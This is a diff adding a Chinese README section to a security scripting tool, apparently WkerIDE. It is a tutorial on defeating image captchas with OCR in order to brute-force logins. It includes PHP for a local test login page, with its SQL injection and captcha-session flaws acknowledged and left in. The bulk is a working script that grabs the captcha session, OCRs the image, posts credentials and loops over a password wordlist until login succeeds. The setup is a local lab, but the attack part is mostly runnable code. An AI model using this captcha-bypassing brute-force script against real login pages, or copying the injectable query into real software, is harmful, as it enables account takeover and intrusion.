@@ -668,6 +668,221 @@ usage: java -jar WkerIDE.jar -g
 
 当然在下载文件中可以直接使用StartV1.X   当然大于1.8的要使用1.9
 
-## V1.23
-1. 修复了多支持库加载格式错误
-2. 增加ORC支持库
+1. ## V1.23
+
+   1. 修复了多支持库加载错误问题
+   2. 增加了OCR识别支持库
+
+   ### 验证码识别爆破
+
+   在我们日常的爆破中会遇到许多阻止我们爆破的一些方式，例如：
+
+   1. js加密
+   2. 验证码
+   3. ....
+
+   js加密的话呢其实相对比较好解决，无非就是下段跟踪，没有太大的难题，但是验证码就比较麻烦了，这个是随机的，就算是人也没办法一直回答正确（今上午注册个账号，验证码搞得我直接放弃了），所以识别验证码是我们需要一起攻克的难题。
+
+   基于图片的验证码识别其实无非就是两种：
+
+   1. OCR的图片识别
+   2. 人工智能训练好的模型
+
+   起初我是想要实现第二种，也就是训练一个模型，但是在我训练的过程中发现java并不是是非的适合于做人工智能，训练是训练了好久，但是发现不是很理想，所以我就转到第一种OCR识别了，网上有比较成熟的库（Test4J），所以我就直接拿过来了，更新到了支持库里面：`ORCLibrary.jar`
+
+   ### 实战
+
+   本地搭建一个存在验证码的登录：
+
+   首先是验证码图片展示的页面(`captcha.php`)：
+
+   ```php
+   <?php
+   //向浏览器输出图片头信息
+   header('Content-type:image/jpeg');
+   $width=120;
+   $height=40;
+   $string='';//定义变量保存字体，这个一定不能省，不然回报警告
+   $img=imagecreatetruecolor($width, $height);//imagecreatetruecolor函数建一个真彩色图像
+   $arr=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');
+   //生成彩色像素    
+   $colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//背景     imagecolorallocate函数为一幅图像分配颜色
+   //填充函数，xy确定坐标，color颜色执行区域填充颜色
+   imagefill($img, 0, 0, $colorBg);
+   for($i=0;$i<4;$i++){
+   	$string.=$arr[rand(0,count($arr)-1)];
+   }
+   session_start();
+   $_SESSION["captcha"]=$string;
+   $colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//文本
+   //2种插入字符串字体的方式
+   //imgettftext($img,字体大小（数字）,角度（数字）,rand(5,15),rand(30,35),$colorString,'字体样式的路径',$string);
+   imagestring($img,5,rand(0,$width-36),rand(0,$height-15),$string,$colorString);
+   //输出图片到浏览器
+   imagejpeg($img);
+   imagedestroy($img);
+   ?>
+   ```
+
+   这个没啥太多好说的，就是生成一张验证码图片，然后将结果存储到session中，这种方法实际上是非常危险的，因为这样子会导致一个session重放的一个漏洞（验证码会失效），但是由于我们是在测试，所以暂时忽略这样子的一个问题。
+
+   账号密码验证(`testyzm.php`):
+
+   ```php+HTML
+   <?php 
+   @$a = $_POST["n"];
+   @$c = $_POST["p"];
+   @$yzm = $_POST["yzm"];
+   if(isset($a) && isset($c) && isset($yzm)) {
+   session_start();
+   if(!isset($_SESSION["captcha"]))
+   {
+   	echo "captcha error";exit();
+   }
+   if($_SESSION["captcha"]!=$yzm)
+   {
+   	echo 'wrong captcha';
+   	exit();
+   }
+   $b = mysql_connect("127.0.0.1",'xxx','xxx');
+   mysql_select_db('fanke',$b);
+   $sql = "select * from user where username='$a' and password='$c'";
+   //echo $sql;
+   $result = mysql_query($sql);
+   if(!$result)
+   {
+   	die(mysql_error());
+   }
+   if($row = mysql_fetch_array($result)){
+   	echo "success<br>";
+   	echo "ID:".$row['id']."<br >";
+   	echo "Ming:".$row['username']."<br >";
+   	echo "mima:".$row['password']."<br >";
+   }else{
+   	echo "error password";
+   }
+   mysql_close($b);
+   }else
+   {?>
+   <form action="testyzm.php" method="POST">
+   name<input name="n" type="text" /><br><br>
+   pass<input name="p" type="text" /><br><br>
+   captcha<input name="yzm" type="text" /><br><br>
+   <img src="captcha.php" onclick="this.src='captcha.php'" title=change"/>
+   <input type="submit" value="tijiao" />
+    </form>
+   <?php }
+   ?>
+   ```
+
+   这个也没啥，就是通过输入的信息，先判断验证码，然后SQL查询，但是这个地方存在一个SQL注入，这里我们也暂时不考虑这些问题！
+
+   好了，到此为止我们的基础信息就已经完成了，下面我们就是要来实现爆破这个信息，这里我先事先说一下，我们的默认账号是：`admin`
+
+   ### 爆破分析
+
+   首先我们想要做暴力破解我们就需要来分析这个网站的一个信息，首先我们先捕获账号密码提交的HTTP数据包：
+
+   ![post](25.jpg)
+
+   是一个post封包：
+
+   1. n为用户名
+   2. p为密码
+   3. yzm为验证码
+
+   到这里我们基本上就算是了解了，但是我们还不知道关键信息
+
+   相应结果：
+
+   1. 密码错误响应结果：`error password`
+   2. 验证码错误响应结果：`wrong captcha`
+   3. 密码正确暂时不知道
+
+   所以我们现在的逻辑就知道了，我们无非就是一个循环发送封包寻找关键字的一个程序罢了，只不过在这期间我们需要识别验证码。
+
+   那么如何传递验证码呢？
+
+   我们访问验证码的图片可以发现，他会响应一个session，这个session里面存储了真正的验证码结果，所以我们需要得到这个session！
+
+   ### 编写代码
+
+   首先我们先要能够现在下来验证码的图片，使用OCR支持库中的`DownLoadImg`库函数
+
+   1. 第一个参数是网络图片地址
+   2. 第二个参数是本地存放的路径
+   3. 返回值是相应的协议头
+
+   我们从响应头中截取关键的session，可以通过前后文本进行区分，所以我们可以编写如下的代码：
+
+   ```javascript
+   function GetPhpSession(header){
+   	return GettextMiddle(header,"PHPSESSID=",";");
+   }
+   function GetCaptcha(path){
+   	return GetPhpSession(DownLoadImg("http://127.0.0.1:8080/captcha.php",path));
+   }
+   ```
+
+   这样子我们只需要调用`GetCaptcha`函数就可以下载验证码并且得到验证码的session
+
+   得到了图片和session之后我们就需要识别验证码，发送数据包，判断响应！
+
+   ```javascript
+   function JudgeSuccess(username,password){
+   	session = GetCaptcha("b.jpg");
+   	captcha = ImgIdVC("b.jpg");
+   	res = HttpPost("http://127.0.0.1:8080/testyzm.php","n=".username."&p=".password."&yzm=".captcha,"Cookie: PHPSESSID=".session);
+   	if(StrFindStr(res[0],"wrong",0) != "-1"){
+   		print("验证码错误:".captcha);
+   		return 1;//验证码错误
+   	}
+   	if(StrFindStr(res[0],"error",0) != "-1"){
+   		print("密码错误:"."用户名:".username."   密码:".password."   验证码:".captcha);
+   		return 2;//密码错误
+   	}
+   	if(StrFindStr(res[0],"success",0) != "-1"){
+   		print("爆破成功,用户名:".username."   密码:".password);
+   		return 3;//账号密码正确
+   	}
+   }
+   ```
+
+   上面的这个函数就是用来爆破的子函数，一共做了下面的几步：
+
+   1. 获取session和下载图片到本地的b.jpg
+   2. 使用本地的`ImgIdVC`库函数识别验证码
+      1. 参数一是图片的本地路径
+      2. 返回值是识别的结果
+   3. 发送post封包，然后保存响应的结果
+   4. 判断响应中是否存在wrong，如果存在返回1，并且打印验证码错误
+   5. 判断响应中是否存在error，如果存在返回2，打印出错误的信息
+   6. 判断响应中是否存在success，如果存在返回3，打印出正确的账号密码（这里是我进行预测的，当然其实这个写不写都可以，如果不存在error和wrong的话呢，说明登录成功）
+
+   爆破的子函数写完之后我们就要在main函数中进行调用：
+
+   ```javascript
+   function main(args)
+   {
+   	username = "admin";
+   	passList = StrSplit(ReadFile("password.txt"),StrRN());
+   	num = GetArrayNum(passList);
+   	i = 0;
+   	while(i<num){
+   		res = JudgeSuccess(username,passList[ToInt(i)]);
+   		if(res == 2){i = i+1;}
+   		if(res == 3){break;}
+   	}
+   	print("爆破完毕");
+   }
+   ```
+
+   首先我们知道账号是admin，然后我们读取本地的password.txt文件，通过\r\n进行分割，得到一个密码字典数组，然后通过遍历数组进行爆破，但是这里有一点需要注意的是，我们如果`JudgeSuccess`返回的是一个1的话呢我们是不让i自增的，因为我们还需要再跑一次这个密码，如果是2则下一个密码，如果是3则密码成功。
+
+   最终我们将会得到下面的结果：
+
+   ![res]jpg/26.jpg)
+
+   可以看到我们最终爆破成功了，验证码识别的并不是完全准确，但是准确率还是可以的。
+
+   当然之后我会添加上需要人工智能的支持库，方便大家调用，并且还会推出许多渗透测试的函数出来！
